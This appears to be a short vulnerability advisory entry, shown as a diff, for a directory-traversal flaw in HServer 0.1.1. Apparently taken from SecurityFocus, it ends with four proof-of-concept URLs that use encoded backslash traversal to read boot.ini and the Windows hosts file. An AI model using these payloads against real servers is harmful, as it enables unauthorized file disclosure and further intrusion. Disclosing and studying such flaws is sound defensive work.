@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/51286/info
+
+HServer web server is prone to a directory-traversal vulnerability because it fails to sufficiently sanitize user-supplied input submitted to its web interface.
+
+Exploiting this issue will allow an attacker to view arbitrary files within the context of the web server. Information harvested may aid in launching further attacks.
+
+HServer 0.1.1 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/..%5c..%5c..%5cboot.ini
+http://www.example.com/..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
+http://www.example.com/%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini
+http://www.example.com/%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cdr ivers%5cetc%5chosts 
